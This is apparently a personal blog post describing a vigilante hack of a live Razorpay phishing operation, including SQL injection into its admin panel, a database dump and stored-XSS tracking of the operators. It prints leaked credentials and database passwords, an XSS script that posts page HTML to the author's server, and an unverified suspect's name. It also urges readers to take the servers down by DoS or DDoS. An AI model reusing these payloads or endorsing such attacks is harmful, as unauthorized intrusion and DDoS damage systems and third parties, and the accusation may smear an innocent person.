---
title: Hacking Razorpay Phishing Scammer
tags: Scam Razorpay Woocommerce wordpress phishing bank money
article_header:
  type: 
  image:
   #src: 
sidebar: 
  nav: blogs
---

*A skill to kill, a skill to save.*

## Background Story

I was recently on a trip, when i got a message from [Madhav Shah](https://www.linkedin.com/in/madhav0x1d/) on LinkedIn about one of his friend getting scammed for 30k from a phishing website. At that time i could not look into it, since i had no access to my machine, in the meanwhile Madhav went ahead and did some really good recon on the website. The information gathered by Madhav really helped with the initial enumeration and understanding of the web application. I wasn't really sure about getting my hands dirty, until i realised the amount of money involved and how often the innocent people were getting scammed. I did some research on the internet about the scam, and the results were shocking.

![t](/Images/razorpay/1.png){:.shadow}

![t](/Images/razorpay/2.png){:.shadow}

![t](/Images/razorpay/3.png){:.shadow}

*Thank you Madhav for reporting, this wouldn't have been possible without you.*

## Getting Scammed 

This scam has been going on for over an year now, based on my analysis at least ten people get phished everyday and get their money stolen. During the entire testing i saw around 20 people getting scammed live. Since, there was no way for me to reach out to these people, i couldn't do much, except putting my skills to test. The entire scam is a three step process. 

### **Luring the victim** 

The scammer first lures the victim into visiting the phishing website using ads to buy things for cheap prices, google ads are used in this case.

![t](/Images/razorpay/4.png){:.shadow}

Notice closely, in top right corner, the domain contains the word `natual` and not `natural`, this is called Typosquatting , the attacker registers a domain name with a slight misspelling of the original/famous domain, so if a user mistypes the URL, he gets redirected to the phishing website.

Once the user clicks on the ad, the user is redirected to an e-commerce website. Where he registers himself, chooses products, add them to cart and finally clicks on checkout.

![t](/Images/razorpay/5.png){:.shadow}

*There are currently two such e-commerce website, `https://dailyfreshnatual.in` and `https://organicnatureschoice.in`, both the websites are running on `woocommerce` platform, with almost same work flows. It is most likely that these websites are maintained by the same scammer team. There's another `puresatvikmilk.com` on the list, but it's not working right now.*
### Phishing the user

Once the user clicks on check out, the user is redirected to a fake `razorpay` gateway for payment.

![t](/Images/razorpay/6.png){:.shadow}

The above page is served by the following domain.

```http
https://globaltechsolutionsinc.in/a/api/rozorpay-secure-pay/aHR0cDovL2xvY2FsaG9zdC90ZXN0Lw--
```

The user enters his card details and clicks on pay now to generate the OTP.

![t](/Images/razorpay/7.png){:.shadow}

Once card details are validated, an OTP is generated and sent to user's registered number (filled out in the e-commerce application). Once the user enters the OTP, he is greeted with the following error message.

![t](/Images/razorpay/8.png){:.shadow}

### Transferring the money

The user thinks the payment must've failed due to some reason. But what happens at the backend is, the attacker takes the information entered by the user and stores it in a database and then goes to the legit payment gateway to make a payment of a much higher amount. This website works as a relay for the scammer to get the legit details and then make further payments.

*Both the e-commerce websites redirects to this common payment gateway. Hence the target was very clear. Taking down `globaltechsolutionsinc.in`*

## Hacking The Scammer

### Inactive

Using the information provided by Madhav, i had access to some sensitive end-points, there were directory listing enabled and some php files, which helped me understand the application's working and uncover a lot of vulnerabilities, but nothing significant. Until i started playing with the admin panel.

![t](/Images/razorpay/9.png){:.shadow}

This scammer, like most of the scammers was also a mediocre. He did not validate his inputs properly. Irresponsible scammer ! 

I did the old, basic, vintage, purana, pracheen SQL injection and i was in. 

![t](/Images/razorpay/10.png){:.shadow}

But there was no data available. I did some enumeration around the login page and other exposed end-points, but found nothing. After a point, it felt like the scam wasn't active anymore and it was all a waste, until i saw a new data entry.

### Active... but hidden

I waited for a while and one by one, the table started to populate with data.

![t](/Images/razorpay/11.png){:.shadow}

But there's a catch, the data only stayed in the table for a while and then it was deleted. I am assuming, the attacker was using this database as a buffer to temporarily store data, every time a new user gets phished, this table is populated, a backup is created and then the data is deleted. This is where things started to get serious, i could see all these innocent people getting scammed by a mediocre scammer, for their hard earned money. 

### Dumping Database

I leveraged SQL injection in order to dump the database and extract more information which could help me in finding out more about the scammer, but there wasn't much except the following set of credentials.

```bash
hax1e4697xxn0hi3r1@gmail.com : f626f4ab367c4cf89ea50330054f2056 
vjdiv3rofwu6nw64@gmail.com  : f8d8510b7026a0d28aacba6a55eac792 pucci1wu3fycel6kd5@alpha.com  : 9140976beb53fa6dc995f298bb7f52e4 
ffba8x5tpwrzzop6iy3@gmail.com : f626f4ab367c4cf89ea50330054f2056
```
### Dumping Source Code

I had my directory buster running in the background. Initially, there weren't any significant result, until i put in the list of extensions to try. Once i did that, i found a zip file of the entire web app in the web app root.

![t](/Images/razorpay/12.png){:.shadow}

Doing source code review was a lot of fun, it felt like i could literally see the inputs flowing from one place to another. The review revealed a lot of vulnerabilities, primarily around SQL Injection and XSS, but nothing i could use to inject code.

During the review I also found few set of credentials from database config files and error logs.

```bash
# From SQL Config Files
glob_user:0G3t0Md1ok
glob_payuser:3QXttFrpFHrMHaojOd
webproolson_animation:animation@12345  

# From Error Logs
guruicom_razor:razor@12345
guruicom_razor:8eSz~Sd*5Bq7
```

One thing i noticed was, the database name `glob_main` mentioned in these files was different from the one i used to dump data. Since, i already had the database credentials, next thing on my mind was to try and connect to the database remotely.

### Uncovering Server IP

The scammer was using Cloudflare to save his ass from people like us, but a simple Censys search revealed the real IP.

![t](/Images/razorpay/13.png){:.shadow}

Once i had the IP, the first thing i did was to confirm if it's indeed the same server, post that ran an Nmap scan and tried connecting to the database remotely, but they had host whitelisting enabled, so that failed too.

### Uncovering Scammer IP

Since the application was already vulnerable to stored XSS, i thought of how can i leverage this to uncover more information on the target. 

![t](/Images/razorpay/16.png){:.shadow}

Assuming this was an admin panel, there must be a legit admin user logging into it from his/her own device. Basis this theory i injected the following payload.

```js
<img src="https://my-domain/">
```

and waited for a request to show up. Soon enough, my logs were populated with following two IPs.

![t](/Images/razorpay/17.png){:.shadow}

There were two unique IPs, `103.182.103.186` and `23.26.221.77`, this was kind of expected, as the scammer was first storing data in a buffer database and then moved it to some other place. In this case `103.182.103.186` is the buffer and `23.26.221.77` is where the data is eventually collected (at least what i think). A simple WHOIS revealed the IPs are located somewhere in Mumbai.

![t](/Images/razorpay/18.png){:.shadow}

![t](/Images/razorpay/19.png){:.shadow}

Both the IPs had RDP and OpenVPN enabled, they are most likely a VPS server as suggested by a friend of mine, used as a pivot point to prevent revealing their real IPs.

Post this, i kinda hit a wall, i tried multiple things around leveraging XSS to get more data, one such attempt worth mentioning was, base64 encoding the current HTML document and sending it over to a server controlled by me. In this manner, if the data was loaded anywhere else, in any other document, it would've given me the entire HTML document, which could've provided more information to play with.

```js
<script>const xhr = new XMLHttpRequest();xhr.open('POST', 'https://my-server/data');xhr.send(btoa(escape(encodeURIComponent(document.documentElement.outerHTML))));</script>
```
## Potential Suspect 

Even though i cannot directly comment on who the scammer is, but there are pieces of information when connected, can show us a direction. Every ad  posted by `Vijay Barbhaya` is of these phishing websites.

![t](/Images/razorpay/14.png){:.shadow}

On doing some OSINT, we can see the skill set of `Vijay Bharbhaya` matches the tech-stack used by the phishing applications.

![t](/Images/razorpay/15.png){:.shadow}

There are other pieces of information as well which i can't seem to connect yet, but you can have a look.

```bash
# Domain : https://dailyfreshnatual.in
- Admin Email : admin@admindavid.com
# Domain : https://organicnatureschoice.in
- Admin Email : info@puresatvikmilk.com
# Database Password
- f626f4ab367c4cf89ea50330054f2056 resolves to `mehul`
# Target IPs
- 176.117.76.42  
- 185.253.218.87
- 103.182.103.186
- 23.26.221.77 : This IP is flagged on virustotal with a file attached to it, the file is an infostealer archive @Everlasting_cloud.rar
```

## How To Contribute

There are different ways in which people with different skillset can contribute to stopping such phishing attacks, this phishing scam is still going on and people are getting scammed even now. I've done most of the things i could do in my personal capacity, but there's a limitation there too. If you wish to contribute, which you definitely should, do the following.

1. Report the domains as phishing [here](https://safebrowsing.google.com/safebrowsing/report_phish/)
2. If you have the hardware capability, try to take these servers down via DOS or DDOS.
3. Contact the ISP and try to gather more information on the IP and who registered it.
4. If you are in cybercrime police department or know someone, reach out to the ISP, as they don't entertain emails normally.
5. Share the scam information with as many people as possible, the only long term way to defeat this, is to be aware of what to click and where to submit.
6. Lastly, if you find a new phishing scam, or a phishing website, or anything that aims to scam people, let us know. It's not possible to hack everything and anything on the internet, but the best we could do is try with what we have.
## Conclusion

This experience made me realise the true meaning of the quote *with great power, comes great responsibility* and also gave me an insight into how direct our impact can be on the society as hackers. I really hope, we all come together to fight against these evils and not just die finishing client reports. Let's make internet a safer place.

*Stay Safe & Keep Hacking*

*Thank you @mostwanted002 for the help :)*

